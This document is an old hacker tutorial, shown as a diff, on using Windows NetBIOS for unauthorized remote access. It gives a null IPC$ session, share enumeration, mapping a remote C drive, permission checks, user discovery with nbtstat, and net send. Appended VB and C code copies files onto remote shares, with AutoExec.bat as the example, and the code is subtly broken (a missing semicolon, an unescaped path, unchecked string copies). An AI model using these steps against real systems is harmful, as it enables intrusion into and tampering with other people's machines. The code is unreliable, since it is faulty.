@@ -1,0 +1,234 @@
+NetBIOS Usage Tutorial
+date: 08.20.01
+written by: r-22
+e-mail: admin@manshadow.org
+http://www.manshadow.org/
+
+netbios, that handy utility for allowing remote access to windows system
+and its files. who would have thought that microsoft would have setup the
+biggest chance for unauthorized remote access to a windows system. well
+maybe i should explain basically what it is and does in a little more detail
+first. with netbios you have whats called shares, these shares are named
+either by default or according to what the administrator desires. the shares
+represent directories on the system that is running the share. like for
+example the default for an NT system are C$, IPC$ and ADMIN$. like you would
+think, the C$ is a share for the C:\ directory and the ADMIN$ is for remote
+administration of the server. well what the hell is IPC$? to my understanding
+this is for when one system needs to use netbios to communicate with another
+system on a system level. it just so happens that you can sometimes trick the
+netbios server into thinking you have rights to access the system by making
+it think you are a system. the technique requires you to log into the ipc$
+share with a NULL username and password. you can do this programatically or
+with just DOS, there may be other methods as well. the dos command for logging
+into shares uses the net command. the net command is useful for a lot of
+things but well just deal with the share mapping for now. the syntax is:
+
+  net use [\\computername | \\ip][\share name]["password"][/user:"username"]
+
+to establish a null ipc session you would do something like:
+
+  net use \\127.0.0.1\ipc$ "" /user:""
+
+this would say use the share ipc$ on 127.0.0.1 with no password and no username.
+you should see Command completed successfully. if it worked. now we want to
+see what exactly they are sharing. to do this you would use the net view
+command, the syntax is:
+  
+  net view [\\computer name | \\ip]
+
+type:
+
+  net view \\127.0.0.1
+
+and this will say that i want to see a list of shares on the machine 127.0.0.1.
+you should see something like this:
+
+
+  Share name   Type         Used as  Comment
+  
+  -------------------------------------------------------------------------------
+  C            Disk
+  D            Disk
+  E            Disk
+  HP DESKJET 6 Print
+  The command completed successfully.
+
+notice the C, D, E and HP DESKJET 6. those are the shares on this particualr
+machine. sometimes it will show the default shares other times it wont. the
+only thing i can figure is that if there are no user defined shares then it will
+show the defaults and if there are user defined shares then it will only show
+the user defined ones. now we want to access C. using a variation on the net use
+command from above we can do:
+  
+  net use * \\127.0.0.1\C
+
+and this will say that i want to map the C share on 127.0.0.1 to my machine. so
+what is the *? that means that it will place the local directory for the share
+next in the list of drive letters. so on my system i would see:
+  
+  F:\ (connected to C on 127.0.0.1)
+  
+that means my F:\ is the remote systems C:\ and that when i view and modify the
+contents of my F:\ i am really viewing the contents on C:\ for the remote machine.
+you can check file access rights with a command called cacls which works basically
+like the dir command. you would use something like cacls autoexec.bat and what you
+are looking for in this case is the Everyone account being set with the F flag which
+means Everyone has Full access. well now its time to see who else is logged in.
+this will use the nbtstat command with the -a switch. something like:
+
+  nbtstat -a 127.0.0.1
+
+will show me results like this:
+
+  Local Area Connection:
+  Node IpAddress: [127.0.0.1] Scope Id: []
+  
+             NetBIOS Remote Machine Name Table
+  
+         Name               Type         Status
+      ---------------------------------------------
+      GIOVE          <00>  UNIQUE      Registered
+      REGNONERO      <00>  GROUP       Registered
+      GIOVE          <03>  UNIQUE      Registered
+      GIOVE          <20>  UNIQUE      Registered
+      REGNONERO      <1E>  GROUP       Registered
+      REGNONERO      <1D>  UNIQUE      Registered
+      ..__MSBROWSE__.<01>  GROUP       Registered
+  
+      MAC Address = 44-45-53-54-00-00
+
+this looks like its just a bunch of crap but its actually useful. you just need
+a table to be able to understand what all the information means. heres the table:
+
+  Name			Number		Type		Usage
+  =========================================================================
+  <computername>	    00		U		Workstation Service
+  <computername>	    01		U		Messenger Service
+  <\\_MSBROWSE_>	    01		G		Master Browser
+  <computername>	    03		U		Messenger Service
+  <computername>	    06		U		RAS Server Service
+  <computername>	    1F		U		NetDDE Service
+  <computername>	    20		U		File Server Service
+  <computername>	    21		U		RAS Client Service
+  <computername>	    22		U		Exchange Interchange 
+  <computername>	    23		U		Exchange Store
+  <computername>	    24		U		Exchange Directory
+  <computername>	    30		U		Modem Sharing Server Service
+  <computername>	    31		U		Modem Sharing Client Service
+  <computername>	    43		U		SMS Client Remote Control
+  <computername>	    44		U		SMS Admin Remote Control Tool
+  <computername>	    45		U		SMS Client Remote Chat
+  <computername>	    46		U		SMS Client Remote Transfer
+  <computername>	    4C		U		DEC Pathworks TCPIP Service
+  <computername>	    52		U		DEC Pathworks TCPIP Service
+  <computername>	    87		U		Exchange MTA
+  <computername>	    6A		U		Exchange IMC
+  <computername>	    BE		U		Network Monitor Agent
+  <computername>	    BF		U		Network Monitor Apps
+  <username>		    03		U		Messenger Service
+  <domain>		    00		G		Domain Name
+  <domain>		    1B		U		Domain Master Browser
+  <domain>		    1C		G		Domain Controllers
+  <domain>		    1D		U 		Master Browser
+  <domain>		    1E		G		Browser Service Elections
+  <INet~Services>	    1C		G		Internet Information Server
+  <IS~Computer_name>        00		U		Internet Information Server
+  <computername>	    [2B]	U		Lotus Notes Server
+  IRISMULTICAST		    [2F]	G		Lotus Notes
+  IRISNAMESERVER	    [33]	G		Lotus Notes
+  Forte_$ND800ZA	    [20]	U		DCA Irmalan Gateway Service
+
+if you look at the printout for the nbtstat you will see that GIOVE has an entry
+for 03 and UNIQUE. now look at the table and see what that means. well assume
+that GIOVE is a username and it says that this is for messenger service. and
+that is someone logged into the system at the time. you can now send messages
+to the remote system using the net send command. in this case i would do something
+like:
+
+  net send giove test
+
+which would send the message "test" to the user GIOVE on the
+system. you may also use ip addresses in place of the name to send messages.
+
+
+************************************************************************************
+************************************************************************************
+
+
+VB and C source code for NetBIOS Transfers
+appended: 12.01.02
+coded by: r-22
+e-mail: admin@manshadow.org
+http://www.manshadow.org/
+
+VB Source:
+    Private Function BlockCopy(sFileOrig As String, sFileNew As String) As Long
+        On Error GoTo ErrTrap
+        Dim bOrig(BLOCK_SIZE) As Byte, bNew() As Byte, nData As Integer
+        Dim nOpenOrig As Integer, nOpenNew As Integer, nK As Integer
+        Dim lStart As Long, lEnd As Long
+        nOpenOrig% = FreeFile
+        Open sFileOrig$ For Binary As #nOpenOrig%
+            lStart& = 1
+            lEnd& = LOF(nOpenOrig%)
+            nData% = ((lEnd& - lStart&) Mod BLOCK_SIZE) - ((lEnd& - lStart&) \ BLOCK_SIZE)
+            ReDim bNew(nData%)
+            nOpenNew% = FreeFile
+            Open sFileNew$ For Output As #nOpenNew%
+            Close #nOpenNew%
+            nOpenNew% = FreeFile
+            Open sFileNew$ For Binary As #nOpenNew%
+                Seek #nOpenOrig%, lStart&
+                For nK% = 0 To ((lEnd& - lStart&) \ BLOCK_SIZE) - 1
+                    Get #nOpenOrig%, , bOrig()
+                    Put #nOpenNew%, , bOrig()
+                Next nK%
+                If ((lEnd& - lStart&) Mod BLOCK_SIZE) > 0 Then
+                    Get #nOpenOrig%, , bNew()
+                    Put #nOpenNew%, , bNew()
+                End If
+            Close #nOpenOrig%
+        Close #nOpenNew%
+        BlockCopy& = 1
+    Exit Function
+    ErrTrap:
+        BlockCopy& = 0
+    End Function
+
+    '/* Usage: lRet& = MoveNetBIOS("192.168.100.1", "C:\AutoExec.bat", "C:\AutoExec.bat") */
+    Public Function MoveNetBIOS(sIP As String, sFileFrom As String, sFileTo As String) As Long
+        On Error GoTo ErrTrap
+        Dim sPath As String
+        sFileTo$ = "\\" & sIP$ & "\" & Replace$(sFileTo$, ":", "")
+        MoveNetBIOS& = BlockCopy(sFileFrom$, sFileTo$)
+    Exit Function
+    ErrTrap:
+        MoveNetBIOS& = 0
+    End Function
+
+
+
+
+C Source:
+    #include <windows.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #define WIN32_LEAN_AND_MEAN
+
+    int MoveNetBIOS(const char *ip_addr, const char *file_from, const char* file_to)
+    {
+        char file_name[MAX_PATH];
+
+        strcpy(file_name, "\\\\");
+        strcat(file_name, ip_addr);
+        strcat(file_name, "\\");
+        strcat(file_name, file_to);
+        CopyFile(file_from, file_name, FALSE);
+        return 1;
+    }
+
+    int main(int argc, char *argv[])
+    {
+        MoveNetBIOS("192.168.100.1", "C:\AutoExec.bat", "C\AutoExec.bat")
+        return 0;
+    }
